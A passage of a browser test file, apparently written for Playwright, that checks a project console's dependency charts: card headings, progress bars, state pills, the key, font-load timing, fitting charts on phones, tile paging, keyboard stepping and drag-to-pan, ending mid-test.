  assert.deepEqual(seen.shown, ['goals']);
  assert.deepEqual(errors, []);
  await context.close();
});

// The console's look (site branch claude/dependencies-look, 2026-10-19, the owner: "dependencies
// still doesnt look very good, i want it to look more modern"): a card per chart, a key, the nodes
// shaded dark by their state in place of the board's light colours, and a wide chart opened at its
// middle. The chart text stays the board's (A); these check what the page does with the picture.
await check('AF: each chart is a card: its heading, for an epic a bar of its closed tasks named for its card, a pill per state of its own issues and one for the blockers from outside it, and a Chart and List switch named for its card, its list hidden behind List; the key shows with the charts, a swatch per state drawn as its nodes are', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const cards = await page.$$eval('#cp-graph .graph__section', (secs) => secs.map((sec) => {
    const bar = sec.querySelector('.graph__bar'), list = sec.querySelector('.graph__list'), views = sec.querySelector('.graph__views');
    return {
      key: sec.getAttribute('data-focus'),
      heading: sec.querySelector('.graph__head > h3').textContent,
      bar: bar ? [bar.getAttribute('role'), bar.getAttribute('aria-valuemin'), bar.getAttribute('aria-valuenow'), bar.getAttribute('aria-valuemax'), bar.querySelector('span').style.width, bar.getAttribute('aria-label'), bar.getAttribute('aria-valuetext')] : null,
      done: sec.querySelector('.graph__done') ? sec.querySelector('.graph__done').textContent : null,
      pills: Array.from(sec.querySelectorAll('.graph__pill')).map((p) => [p.className, p.textContent]),
      views: views ? [views.getAttribute('role'), views.getAttribute('aria-label')].concat(Array.from(views.querySelectorAll('button')).map((b) => b.textContent + ' ' + b.getAttribute('aria-pressed'))) : null,
      list: list ? [list.hidden, list.querySelectorAll('table').length, list.querySelectorAll('tbody tr').length] : null,
    };
  }));
  const key = await page.evaluate(() => {
    const k = document.getElementById('cp-graph-key');
    const edge = (c) => { const b = getComputedStyle(k.querySelector('.graph__swatch--' + c), '::before'); return [b.borderTopStyle, b.borderTopWidth, b.borderTopColor, b.backgroundColor]; };
    return {
      hidden: k.hidden, inTab: !!k.closest('#tab-dependencies'), label: k.getAttribute('aria-label'),
      sets: Array.from(k.children).map((set) => Array.from(set.children).map((c) => c.textContent.trim())),
      edges: Object.fromEntries(['todo', 'claimed', 'review', 'blocked', 'closed', 'open'].map((c) => [c, edge(c)])),
    };
  });
  console.log('     cards:', JSON.stringify(cards), '| key:', JSON.stringify(key));
  assert.deepEqual(cards, [
    { key: 'goals', heading: 'Goals', bar: null, done: null, pills: [['graph__pill graph__pill--todo', '1 to do'], ['graph__pill graph__pill--plain', '1 open']],
      views: ['group', 'Show Goals as', 'Chart true', 'List false'], list: [true, 1, 2] },
    // #99 blocks #22 from outside the epic: no task of it, so the pills of its tasks add up to the
    // bar's three and #99 is counted apart
    { key: 'epic-20', heading: 'Epic #20: Draw the board (1/3)', bar: ['progressbar', '0', '1', '3', '33%', 'Epic #20: Draw the board (1/3): tasks closed', '1 of 3 closed'], done: '1 of 3 closed',
      pills: [['graph__pill graph__pill--todo', '1 to do'], ['graph__pill graph__pill--claimed', '1 claimed'], ['graph__pill graph__pill--closed', '1 closed'], ['graph__pill graph__pill--outside', '1 from outside the epic']],
      views: ['group', 'Show Epic #20: Draw the board (1/3) as', 'Chart true', 'List false'], list: [true, 1, 4] },
  ]);
  // each swatch's edge and fill as its nodes are edged and filled (AH): blocked thick, claimed
  // dotted, closed dashed, in review lit and open's edge pale
  const swatch = (style, width, c) => [style, width, SHADES[c].stroke, SHADES[c].fill];
  assert.deepEqual(key, { hidden: false, inTab: true, label: 'Key to the charts',
    sets: [['To do', 'Claimed', 'In review', 'Blocked', 'Closed', 'Open'], ['blocks', 'blocked, now closed', 'goal to its epic']],
    edges: {
      // a border of 1.5 px is drawn, and given, as 1 px on a screen of one pixel to the px
      todo: swatch('solid', '1px', 'todo'), claimed: swatch('dotted', '2px', 'claimed'), review: swatch('solid', '1px', 'review'),
      blocked: swatch('solid', '3px', 'blocked'), closed: swatch('dashed', '1px', 'closed'), open: swatch('solid', '1px', ''),
    } });
  assert.deepEqual(errors, []);
  await context.close();
});

await check('AG: the key is hidden while there is nothing to draw and while a Refresh reads again, and shows once the charts are there', async () => {
  const f = fixture();
  const none = baseRoutes('acme/demo', [issue(99, 'Settle the colours', ['todo'])]);
  const empty = await open(none, { extraRoutes: [stubRoute] });
  await signIn(empty.page);
  await waitGraph(empty.page, /^Nothing to draw yet/);
  const hiddenEmpty = await empty.page.evaluate(() => document.getElementById('cp-graph-key').hidden);
  await empty.context.close();
  const routes = fixtureRoutes(f);
  let slow = false;
  routes['GET /repos/acme/demo/issues/20/sub_issues'] = () => (slow ? resp(200, f.subIssues[20], { delayMs: 2500 }) : f.subIssues[20]);
  const { context, page, errors } = await open(routes, { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const shown = await page.evaluate(() => document.getElementById('cp-graph-key').hidden);
  slow = true;
  await page.click('#cp-refresh');
  await waitGraph(page, /^Reading the sub-issues/);
  const reading = await page.evaluate(() => document.getElementById('cp-graph-key').hidden);
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const again = await page.evaluate(() => document.getElementById('cp-graph-key').hidden);
  // the epic and the goal gone from the open list: a Refresh that finds nothing to draw hides the
  // key the charts showed
  slow = false;
  routes['GET /repos/acme/demo/issues'] = f.open.filter((it) => it.number !== 20 && it.number !== 30);
  await page.click('#cp-refresh');
  await waitGraph(page, /^Nothing to draw yet/, 15000);
  const gone = await page.evaluate(() => document.getElementById('cp-graph-key').hidden);
  console.log('     key hidden with nothing:', hiddenEmpty, '| drawn:', shown, '| reading:', reading, '| drawn again:', again, '| nothing left to draw:', gone);
  assert.deepEqual([hiddenEmpty, shown, reading, again, gone], [true, false, true, false, true]);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('AH: drawn by the real Mermaid in the console\'s look, no node keeps the board\'s light colours: each of the six states is shaded and edged as its own, no two by hue alone, its box rounded, a closed one struck through, no label is cut though the site\'s face comes late, and the arrows keep their own look', async () => {
  // the face is handed over 1.5 s after the drawing script: Mermaid, waiting for it, measures in it
  const face = lateFace((release) => setTimeout(release, 1500));
  const { context, page, errors } = await open(fixtureRoutes(fixtureStates()), { extraRoutes: face.routes, waitUntil: 'domcontentloaded' });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  await toTab(page, 'dependencies');
  await page.click('#cp-graph-focus button[data-focus="all"]');
  await faceIn(page);
  const nodes = await readNodes(page, '#cp-graph');
  // the arrows: Mermaid's lines, which graphRestyle leaves alone, are drawn with no fill
  const edges = await page.$$eval('#cp-graph .control__chart .edgePaths path', (ps) => ps.map((p) => getComputedStyle(p).fill));
  console.log('     nodes:', JSON.stringify(nodes), '| edges\' fill:', JSON.stringify(edges));
  assert.equal(nodes.length, 6);
  assertShaded(nodes);
  assertNotHueAlone(nodes);
  assert.deepEqual(nodes.map((x) => [x.n, x.state]).sort((a, b) => a[0] - b[0]), [[20, ''], [21, 'closed'], [22, 'claimed'], [23, 'blocked'], [30, 'todo'], [99, 'review']]);
  assert.ok(edges.length >= 3, 'the arrows were not found');
  assert.ok(edges.every((e) => e === 'none'), 'an arrow is drawn filled');
  assert.deepEqual(errors, []);
  face.release();
  await context.close();
});

// The wait for the site's face is bounded: where its file never comes, as on a network that stalls
// the font host, the charts are drawn in the fallback face a moment later, never held for good.
await check('AP: a site face that never arrives holds the charts back no longer than the page\'s wait of 2.5 s, drawn within 5.5 s of the drawing script', async () => {
  let handed = 0;
  const face = lateFace(() => { handed = Date.now(); });
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: face.routes, waitUntil: 'domcontentloaded' });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/, 20000);
  const took = Date.now() - handed;
  const svgs = await page.$$eval('#cp-graph svg', (l) => l.length);
  console.log('     drawn', took, 'ms after the drawing script was handed over, with the face never served | charts:', svgs);
  assert.equal(svgs, 2);
  assert.ok(handed > 0, 'the drawing script was never asked for');
  // it waited for the face (2.5 s), and no longer than that and the drawing take, about a second
  // here: 5.5 s leaves room for a slower machine and fails a wait of 6 s, which drew at 6.9 s
  assert.ok(took >= 2300 && took < 5500, 'the charts were drawn ' + took + ' ms after the script came');
  assert.deepEqual(errors, []);
  face.release();
  await context.close();
});

await check('AI: a chart far larger than its stage opens whole on a phone, in whichever of its two layouts draws it larger, though it was drawn in a hidden tab, is drawn whole again when the window grows and when it shrinks, and once the person zooms in by a double tap keeps their zoom when it changes', async () => {
  const kids = Array.from({ length: 12 }, (_, i) => issue(71 + i, 'Task number ' + (i + 1) + ' of the wide epic', ['todo']));
  const routes = baseRoutes('acme/demo', [issue(70, 'A wide epic', ['epic'], subs(0, 12))].concat(kids));
  routes['GET /repos/acme/demo/issues/70/sub_issues'] = kids;
  const opened = await open(routes, { viewport: { width: 390, height: 844 }, mobile: true });
  const { page, errors } = opened;
  await signIn(page, null);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 1 read/, 15000);
  const hiddenWhileDrawn = await page.evaluate(() => document.getElementById('tab-dependencies').hidden);
  await toTab(page, 'dependencies');
  await page.waitForFunction(() => { const h = document.querySelector('#cp-graph .control__chart'); return h && h.clientWidth > 0 && /scale/.test(h.querySelector('svg').style.transform); }, null, { timeout: 8000 });
  await sleep(300);
  const first = await stageRead(page);
  assertWhole(first, 'the wide chart opened on a phone');
  // the window changes while the chart is whole, wider and taller, so its stage grows whichever way
  // limits the fit: it is fitted to its new size
  await page.setViewportSize({ width: 420, height: 900 });
  await sleep(500);
  const turned = await stageRead(page);
  assertWhole(turned, 'the wide chart once the window changed');
  // and back, narrower and shorter, so its stage shrinks: fitted again, never left larger than it
  await page.setViewportSize({ width: 390, height: 844 });
  await sleep(500);
  const shrunk = await stageRead(page);
  assertWhole(shrunk, 'the wide chart once the window shrank');
  // a finger's double tap zooms in about its point, and the window changing then keeps that zoom
  const m = await stageMid(page);
  await page.touchscreen.tap(m.x, m.y);
  await sleep(60);
  await page.touchscreen.tap(m.x, m.y);
  await sleep(500);
  const zoomed = await stageRead(page);
  await page.setViewportSize({ width: 420, height: 900 });
  await sleep(500);
  const after = await stageRead(page);
  console.log('     drawn hidden:', hiddenWhileDrawn, '| opened at:', JSON.stringify([first.k, first.w, first.box]), '| the window wider:', JSON.stringify([turned.k, turned.box]), '| back:', JSON.stringify([shrunk.k, shrunk.box]), '| zoomed:', zoomed.k, '| the window wider again:', JSON.stringify([after.k, after.box]));
  assert.equal(hiddenWhileDrawn, true);
  assert.ok(first.k < 0.5, 'the chart is not large enough beside its stage to say anything: ' + JSON.stringify([first.k, first.w, first.h, first.box]));
  assert.ok(turned.k > first.k * 1.05, 'the chart was not fitted again to the wider window');
  assert.ok(shrunk.k < turned.k / 1.05, 'the chart was not fitted again to the narrower window');
  assert.ok(Math.abs(zoomed.k - 2 * shrunk.k) < 1e-3, 'the double tap did not zoom in twice: ' + zoomed.k);
  assert.ok(Math.abs(after.k - zoomed.k) < 1e-6, 'the person\'s zoom was thrown away when the window changed: ' + after.k);
  assert.deepEqual(errors, []);
  await opened.context.close();
});

// The tiles, the stepping and the moving about (the owner, 2026-10-19: "make the epics more intuitive
// and navigating that page more fluent"): a bar of each chart's issues by state on its tile, several
// tiles to a row on a laptop and one row on a phone, a page of them at a time with the chosen one in
// view, Previous and Next on each card, the arrow keys on the tiles, a zoomed chart dragged with the
// mouse, Whole chart, and a fade.
// A goal over n epics, numbered 100, 200 and on: the first epic has one task, the second two and so
// on to five, then again, one in each state where there are enough, so the cards' pills differ; the
// titles run from a word to two lines of a heading. With wide, the second epic has twelve tasks
// side by side instead, a chart wider than its card.
const MANY_TITLES = ['Dependencies look modern', 'Sign in from the phone', 'Make the console scale on every screen from a phone held upright to a twenty-seven inch monitor, with the tiles filling each row and the charts taking the rest of the deck', 'Ship', 'Chain the release pipeline'];
function manyRoutes(n, wide) {
  const listed = [issue(1, 'Ship the console to everyone', ['goal'], subs(0, n))];
  const reads = {}, epics = [];
  const states = [['todo'], ['claimed'], ['in-review'], ['blocked'], []];
  for (let e = 0; e < n; e++) {
    const num = 100 * (e + 1), isWide = wide && e === 1, count = isWide ? 12 : 1 + (e % 5);
    const kids = Array.from({ length: count }, (_, k) => issue(num + k + 1, 'Task ' + (k + 1) + ' of epic ' + num, isWide ? ['todo'] : states[k % 5]));
    const epic = issue(num, MANY_TITLES[e % MANY_TITLES.length], ['epic'], subs(0, count));
    epics.push(epic);
    listed.push(epic, ...kids);
    reads['GET /repos/acme/demo/issues/' + num + '/sub_issues'] = kids;
  }
  reads['GET /repos/acme/demo/issues/1/sub_issues'] = epics;
  return Object.assign(baseRoutes('acme/demo', listed), reads);
}

const segs = (page, key) => page.$eval('#cp-graph-focus .graph__chip[data-focus="' + key + '"] .graph__tbar', (bar) => [bar.getAttribute('aria-hidden')].concat(Array.from(bar.children).map((s) => s.className.replace('graph__seg graph__seg--', '') + ' ' + s.style.width)));
await check('AJ: each tile carries a bar of its chart\'s own issues by state, an epic\'s tasks without its blockers from outside, All every epic\'s tasks; the tiles share a row on a laptop, and on a phone share one row that never scrolls, a page of them at a time where they are many, the chosen tile\'s page brought into view, a kept one\'s too when the tab opens after the draw', async () => {
  // epic #20 with a fourth task, #26 to do, so its tasks are two to do, one claimed and one closed;
  // #99, which blocks #22 from outside the epic, is no task of it and not in its bar
  const f = fixture();
  const i26 = issue(26, 'Draw the legend', ['todo']);
  f.open = f.open.map((it) => it.number === 20 ? Object.assign({}, it, subs(1, 4)) : it).concat([i26]);
  f.subIssues[20] = f.subIssues[20].concat([i26]);
  const { context, page, errors } = await open(fixtureRoutes(f), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const bars = { all: await segs(page, 'all'), goals: await segs(page, 'goals'), epic: await segs(page, 'epic-20') };
  const row = await page.$$eval('#cp-graph-focus .graph__chip', (bs) => bs.map((b) => [Math.round(b.getBoundingClientRect().top), Math.round(b.getBoundingClientRect().width)]));
  console.log('     bars:', JSON.stringify(bars), '| laptop tiles (top, width):', JSON.stringify(row));
  assert.deepEqual(bars.epic, ['true', 'todo 50%', 'claimed 25%', 'closed 25%']);
  assert.deepEqual(bars.all, bars.epic, 'All\'s bar is not every epic\'s tasks together');
  assert.deepEqual(bars.goals, ['true', 'todo 50%', 'plain 50%']);
  assert.ok(row.every((r) => r[0] === row[0][0]), 'the tiles do not share a row on a laptop');
  assert.ok(row.every((r) => r[1] >= 150), 'a tile is narrower than 150 px on a laptop');
  assert.deepEqual(errors, []);
  await context.close();
  // a phone: the three tiles share the row; a goal over five epics, seven tiles, come a page at a time
  const stripOf = (page) => page.evaluate(() => {
    const s = document.getElementById('cp-graph-focus'), sr = s.getBoundingClientRect();
    const on = s.querySelector('[aria-pressed="true"]'), r = on.getBoundingClientRect();
    const shown = Array.from(s.querySelectorAll('.graph__chip')).filter((b) => !b.hidden);
    const tops = shown.map((b) => Math.round(b.getBoundingClientRect().top));
    // the mouse a click left over a tile lifts it a pixel (its hover), which is no second row: the
    // window the tab brings to the rail now scrolls a tile under where the rail's button was pressed
    return { scrolls: s.scrollWidth > s.clientWidth + 1 || s.scrollHeight > s.clientHeight + 1, shown: shown.length, oneRow: tops.every((t) => Math.abs(t - tops[0]) <= 1),
      rows: tops.filter((t, i) => tops.findIndex((u) => Math.abs(u - t) <= 1) === i).length,
      inside: shown.every((b) => { const x = b.getBoundingClientRect(); return x.left >= sr.left - 1 && x.right <= sr.right + 1; }),
      pressed: on.getAttribute('data-focus'), inView: !on.hidden && r.width > 0 && r.left >= sr.left - 1 && r.right <= sr.right + 1, paged: Array.from(s.querySelectorAll('.graph__page')).some((b) => !b.hidden), page: document.documentElement.scrollWidth };
  });
  const three = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute], viewport: { width: 390, height: 844 }, mobile: true });
  await signIn(three.page);
  await waitGraph(three.page, /^Drawn from 4 reads/, 15000);
  await three.page.$eval('#cp-graph-focus .graph__chip[data-focus="epic-20"]', (b) => b.click());
  const few = await stripOf(three.page);
  console.log('     a phone\'s three tiles after a press on the last:', JSON.stringify(few));
  assert.deepEqual([few.scrolls, few.shown, few.oneRow, few.inside, few.inView, few.paged], [false, 3, true, true, true, false], 'the phone\'s three tiles do not share one row that never scrolls');
  assert.ok(few.page <= 390, 'the tiles widen the page past the phone: ' + few.page);
  assert.deepEqual(three.errors, []);
  await three.context.close();
  const phone = await open(manyRoutes(5), { extraRoutes: [stubRoute], viewport: { width: 390, height: 844 }, mobile: true });
  await signIn(phone.page);
  await waitGraph(phone.page, /^Drawn from 6 reads/, 15000);
  const start = await stripOf(phone.page);
  // Next on the card, pressed until its chart's tile is on the second page
  for (let i = 0; i < 3; i++) { await phone.page.click('#cp-graph .graph__section:not([hidden]) .graph__next'); await sleep(150); }
  const stepped = await stripOf(phone.page);
  console.log('     seven tiles on a phone:', JSON.stringify(start), '| after Next three times:', JSON.stringify(stepped));
  // since the phone's console holds the screen as a laptop's does (site branch
  // claude/project-thread-6cxgh2, 2026-10-20), the tab sizes its tiles as on a laptop: a page at a
  // time in one row, or all of them in two rows where the screen is tall enough to spare one (AW)
  assert.deepEqual([start.scrolls, start.inside, start.inView], [false, true, true], 'the phone\'s seven tiles scroll or run out of their row');
  assert.ok((start.paged && start.oneRow && start.shown < 7) || (!start.paged && start.shown === 7 && start.rows <= 2), 'the phone\'s seven tiles are neither a page at a time in one row nor all in two rows: ' + JSON.stringify(start));
  assert.deepEqual([stepped.pressed, stepped.scrolls, stepped.inView, stepped.inside], ['epic-300', false, true, true], 'the chosen tile\'s page was not brought into view');
  assert.ok(stepped.page <= 390, 'the tiles widen the page past the phone: ' + stepped.page);
  assert.deepEqual(phone.errors, []);
  await phone.context.close();
  // the last tile kept as the choice and the charts drawn while the console stands on another tab,
  // where the strip has no width: its tile's page is brought into view once the tab opens; twelve
  // epics, since a phone's tab may lay seven tiles out in two rows with no pages (above)
  const later = await open(manyRoutes(12), { extraRoutes: [stubRoute], viewport: { width: 390, height: 844 }, mobile: true, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-1200' }) } });
  await signIn(later.page, null);
  await waitGraph(later.page, /^Drawn from 13 reads/, 15000);
  const hiddenWhileDrawn = await later.page.evaluate(() => document.getElementById('tab-dependencies').hidden);
  await toTab(later.page, 'dependencies');
  await later.page.waitForFunction(() => document.getElementById('cp-graph-focus').clientWidth > 0, null, { timeout: 5000 });
  await sleep(300);
  const kept = await stripOf(later.page);
  console.log('     drawn on another tab:', hiddenWhileDrawn, '| the kept tile once the tab opened:', JSON.stringify(kept));
  assert.equal(hiddenWhileDrawn, true, 'the charts were not drawn while the tab was hidden');
  assert.equal(kept.paged, true, 'the tiles are not in pages, so this says nothing');
  assert.deepEqual([kept.pressed, kept.inView, kept.scrolls], ['epic-1200', true, false], 'the kept tile is not in view once the tab opened after the draw');
  assert.deepEqual(later.errors, []);
  await later.context.close();
});

const stepState = (page) => page.evaluate(() => {
  const shown = Array.from(document.querySelectorAll('#cp-graph .graph__section')).filter((s) => !s.hidden);
  const a = document.activeElement;
  return {
    shown: shown.map((s) => s.getAttribute('data-focus')),
    steps: shown.map((s) => { const n = s.querySelector('.graph__step'); return n && getComputedStyle(n).display !== 'none' ? [n.querySelector('.graph__prev').disabled, n.querySelector('.graph__pos').textContent, n.querySelector('.graph__next').disabled] : null; }),
    focus: a && a.closest && a.closest('.graph__section') ? a.closest('.graph__section').getAttribute('data-focus') + ' ' + a.className.replace('graph__stepbtn ', '') : (a ? a.tagName : ''),
    kept: localStorage.getItem('symphony_panel_graph_focus'),
  };
});
await check('AK: Previous and Next on each card step to the chart beside it, keeping the keyboard on the card they show and the choice for next time; the first has no Previous, the last no Next, and All shows none', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const first = await stepState(page);
  const next = await page.$eval('#cp-graph .graph__section[data-focus="goals"] .graph__next', (b) => [b.getAttribute('aria-label'), b.title]);
  await page.click('#cp-graph .graph__section[data-focus="goals"] .graph__next');
  const second = await stepState(page);
  await page.keyboard.press('Enter');
  const back = await stepState(page);
  await page.click('#cp-graph-focus button[data-focus="all"]');
  const all = await stepState(page);
  console.log('     first:', JSON.stringify(first), '| Next:', JSON.stringify(next), '| after Next:', JSON.stringify(second), '| Enter on the button kept:', JSON.stringify(back), '| All:', JSON.stringify(all));
  assert.deepEqual(first.shown, ['goals']);
  assert.deepEqual(first.steps, [[true, '1 of 2', false]]);
  assert.deepEqual(next, ['Next chart: Epic #20: Draw the board (1/3)', 'Epic #20: Draw the board (1/3)']);
  assert.deepEqual([second.shown, second.steps, second.focus], [['epic-20'], [[false, '2 of 2', true]], 'epic-20 graph__prev']);
  assert.deepEqual(JSON.parse(second.kept), { 'acme/demo': 'epic-20' });
  assert.deepEqual([back.shown, back.focus], [['goals'], 'goals graph__next'], 'Enter on the kept button did not step back');
  assert.deepEqual([all.shown, all.steps], [['goals', 'epic-20'], [null, null]], 'All shows the cards\' Previous and Next');
  assert.deepEqual(errors, []);
  await context.close();
});

await check('AL: the arrow keys move from tile to tile and show its chart, Home and End across every tile to the first and the last, and a key at either end, which moves nowhere, changes nothing: no fade again and no choice written', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  // the tile with the keyboard, the tile pressed, the charts shown, whether a chart shown faded in
  // again, and the choice kept, which is set aside before each key so a key that writes it shows
  const at = () => page.evaluate(() => {
    const shown = Array.from(document.querySelectorAll('#cp-graph .graph__section')).filter((s) => !s.hidden);
    return [document.activeElement.getAttribute('data-focus'), Array.from(document.querySelectorAll('#cp-graph-focus .graph__chip')).filter((b) => b.getAttribute('aria-pressed') === 'true').map((b) => b.getAttribute('data-focus')).join(),
      shown.map((s) => s.getAttribute('data-focus')).join(), shown.some((s) => s.classList.contains('graph__section--enter')), localStorage.getItem('symphony_panel_graph_focus')];
  });
  await page.focus('#cp-graph-focus button[data-focus="all"]');
  const seen = [];
  // End is pressed from the first tile and Home from the last, so each crosses two tiles, where a
  // key that moved one would stop short
  for (const key of ['ArrowRight', 'ArrowRight', 'ArrowRight', 'ArrowLeft', 'Home', 'End', 'Home', 'ArrowLeft']) {
    await page.evaluate(() => { document.querySelectorAll('#cp-graph .graph__section').forEach((s) => s.classList.remove('graph__section--enter')); localStorage.setItem('symphony_panel_graph_focus', '{}'); });
    await page.keyboard.press(key);
    seen.push([key].concat(await at()));
  }
  console.log('     keys:', JSON.stringify(seen));
  const kept = (key) => JSON.stringify({ 'acme/demo': key });
  assert.deepEqual(seen, [
    ['ArrowRight', 'goals', 'goals', 'goals', true, kept('goals')],
    ['ArrowRight', 'epic-20', 'epic-20', 'epic-20', true, kept('epic-20')],
    ['ArrowRight', 'epic-20', 'epic-20', 'epic-20', false, '{}'],
    ['ArrowLeft', 'goals', 'goals', 'goals', true, kept('goals')],
    ['Home', 'all', 'all', 'goals,epic-20', true, kept('all')],
    ['End', 'epic-20', 'epic-20', 'epic-20', true, kept('epic-20')],
    ['Home', 'all', 'all', 'goals,epic-20', true, kept('all')],
    ['ArrowLeft', 'all', 'all', 'goals,epic-20', false, '{}'],
  ]);
  assert.deepEqual(errors, []);
  await context.close();
});

// an epic of twelve tasks and no blockers, drawn by the real Mermaid twelve boxes wide
function wideRoutes(extra) {
  const kids = Array.from({ length: 12 }, (_, i) => issue(71 + i, 'Task number ' + (i + 1) + ' of the wide epic', ['todo']));
  const routes = baseRoutes('acme/demo', [issue(70, 'A wide epic', ['epic'], subs(0, 12))].concat(kids, extra || []));
  routes['GET /repos/acme/demo/issues/70/sub_issues'] = kids;
  return routes;
}
// where the chart, the tab and the window stand: the picture's place and scale, the tab's box's
// offset, the window's, the address, the said line and the stage's pointer
const panState = (page) => page.evaluate(() => {
  const sec = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden);
  const h = sec.querySelector('.control__chart'), svg = Array.from(h.querySelectorAll(':scope > svg')).find((x) => x.style.display !== 'none');
  const m = /translate\(([-0-9.e]+)px, ([-0-9.e]+)px\) scale\(([0-9.e-]+)\)/.exec(svg.style.transform) || [];
  const box = h.closest('.console__scroll');
  return { x: Number(m[1]), y: Number(m[2]), k: Number(m[3]), top: box.scrollTop, stage: [h.scrollLeft, h.scrollTop], win: Math.round(window.scrollY), tab: location.hash, said: document.getElementById('cp-graph-said').textContent,
    near: !!sec.querySelector('.graph__near:not([hidden])'), cursor: getComputedStyle(h).cursor, panning: h.classList.contains('control__chart--panning') };
});
// epic #20's chart zoomed in with its + button, three presses, to more than twice its size, so it is
// larger than its stage both ways; the stage's spot nearest its top left corner that holds no node
async function zoomedEpic(page) {
  await page.click('#cp-graph-focus button[data-focus="epic-20"]');
  for (let i = 0; i < 3; i++) await page.click('#cp-graph .graph__section[data-focus="epic-20"] button.graph__zbtn[aria-label="Zoom in"]');
  await sleep(400);
  const s = await stageRead(page);
  // room to move 50 px sideways and 30 px up and down before an edge stops it
  assert.ok(s.inner.r - 12 - s.pic.r <= -55 && s.inner.b - 12 - s.pic.b <= -35, 'the zoomed chart has no room to move inside its stage both ways: ' + JSON.stringify([s.k, s.box, s.pic, s.inner]));
  return freeSpot(page);
}
const freeSpot = (page) => page.evaluate(() => {
  const h = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((x) => !x.hidden).querySelector('.control__chart'), b = h.getBoundingClientRect();
  for (let y = b.top + 20; y < b.bottom - 20; y += 10) for (let x = b.left + 20; x < b.right - 20; x += 10) { const e = document.elementFromPoint(x, y); if (e && h.contains(e) && !e.closest('g.node')) return { x, y }; }
  return null;
});
await check('AM: a chart zoomed in is dragged with the mouse like a map, both ways, and stops at its edges, where the page scrolls as a whole too; the stage, the tab and the window never scroll; a drag presses no node, even one that ends where it began, and a press that shakes a little still opens its node in focus', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width: 1280, height: 700 } });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const r = await zoomedEpic(page);
  assert.ok(r, 'no spot of the stage is free of nodes');
  const before = await panState(page);
  await drag(page, r, { x: r.x - 50, y: r.y - 30 });
  const dragged = await panState(page);
  // dragged far past each corner, the picture stops with its edge 12 px inside the stage's
  await drag(page, r, { x: r.x + 3000, y: r.y + 3000 }, 12);
  const topLeft = await stageRead(page);
  await drag(page, r, { x: r.x - 3000, y: r.y - 3000 }, 12);
  const bottomRight = await stageRead(page);
  const edges = [topLeft.pic.l - topLeft.inner.l, topLeft.pic.t - topLeft.inner.t, bottomRight.inner.r - bottomRight.pic.r, bottomRight.inner.b - bottomRight.pic.b].map(Math.round);
  // a drag that starts on a node and comes back to it, which the browser ends with a click on that node;
  // the last drag left the picture against its far edge, so this one goes the way the picture can
  // follow and back, the node ending under the pointer again, where a press would find it
  const node = await nodeAt(page, 23);
  await page.mouse.move(node.x, node.y);
  await page.mouse.down();
  await page.mouse.move(node.x + 120, node.y, { steps: 4 });
  await page.mouse.move(node.x, node.y, { steps: 4 });
  await page.mouse.up();
  // a press taken from the drag opens its node late on a busy machine, so the read waits for it a while
  await waitNear(page, 23, null, 2500).catch(() => {});
  const roundTrip = await panState(page);
  const node2 = await nodeAt(page, 23);
  await page.mouse.move(node2.x, node2.y);
  await page.mouse.down();
  await page.mouse.move(node2.x + 2, node2.y + 1);
  await page.mouse.up();
  await waitNear(page, 23).catch(() => {});
  const shaken = await panState(page);
  console.log('     before:', JSON.stringify(before), '| dragged:', JSON.stringify(dragged), '| edges past each corner:', JSON.stringify(edges), '| a drag from a node and back:', JSON.stringify([roundTrip.near, roundTrip.tab]), '| a shaken press:', JSON.stringify([shaken.near, shaken.tab]));
  assert.equal(before.cursor, 'grab');
  assert.ok(Math.abs(dragged.x - before.x + 50) <= 2 && Math.abs(dragged.y - before.y + 30) <= 2, 'the chart did not move both ways with the drag: ' + JSON.stringify([before, dragged]));
  assert.deepEqual(edges, [12, 12, 12, 12], 'the chart was dragged past its edges, or stopped short of them');
  assert.deepEqual([dragged.top, dragged.stage, dragged.win, dragged.tab, dragged.said, dragged.near], [0, [0, 0], 0, '#dependencies', '', false], 'the drag scrolled something or pressed something');
  assert.deepEqual([roundTrip.tab, roundTrip.near], ['#dependencies', false], 'a drag that came back to its node pressed it');
  assert.deepEqual([shaken.tab, shaken.near], ['#dependencies', true], 'a press that shook a little did not open its node in focus');
  assert.deepEqual(errors, []);
  await context.close();
  // a window 800 px wide, a phone's layout, where the console holds the screen (site branch
  // claude/project-thread-6cxgh2): the drag still moves the chart, and the page stays where it was
  const narrow = await open(fixtureRoutes(fixture()), { viewport: { width: 800, height: 700 } });
  await signIn(narrow.page);
  await narrow.page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(narrow.page, /^Drawn from 4 reads/, 15000);
  const scrolls = await narrow.page.evaluate(() => getComputedStyle(document.getElementById('console')).overflow !== 'hidden');
  const p = await zoomedEpic(narrow.page);
  const start = await panState(narrow.page);
  await drag(narrow.page, p, { x: p.x - 50, y: p.y - 30 });
  const end = await panState(narrow.page);
  console.log('     at 800 px: before', JSON.stringify(start), '| after the drag', JSON.stringify(end));
  assert.equal(scrolls, false, 'the console does not hold the screen at 800 px');
